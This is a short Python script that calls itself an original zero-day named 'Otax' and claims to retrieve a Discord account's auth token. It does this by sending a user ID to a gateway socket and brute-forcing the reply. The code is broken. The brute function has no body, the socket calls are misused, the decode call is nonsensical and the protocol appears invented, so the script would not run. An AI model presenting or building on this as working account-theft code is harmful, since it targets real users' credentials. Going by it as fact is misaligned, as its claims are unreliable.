import socket

# Otax, an original zero-day written by me: 0x44F
# Do not take credit for this you fucking loser.

class Websock:
  
    def __init__(self, src_ip, gateway, port: int):
        self.ip = src_ip
        self.gateway = gateway
        self.port = port
        
        self.noauth_key = gateway.encode()
        
    def connect(self) -> bool:
        for _ in range(12):
            print("Connecting to {}...".format(self.gateway))
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.connect((self.gateway, self.port))
                sock.sendto('{"Authentication": "GFAUTH",\n"DATA": null }')
            except TimeoutError:
                return False
            
            return True
       
    def send_pkt(self, user_id: str) -> str:
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.gateway, self.port+1))
        sock.send(user_id.encode())
        auth_token = sock.recv(512)
        
        return auth_token
    
def brute(number,uppercase,lowercase,delay):
    # Write your own function

if __name__ == "__main__":
    print("Otax, made by 0x44F")
    websocket = Websock("127.0.0.1","dga.gateway.discord.gg",512)
    websocket.connect()
    
    enc = websocket.send_pkt(input("user id: "))
    token = enc.decode(brute(7,True,True,False,0))
    print("Token: "+token)
    
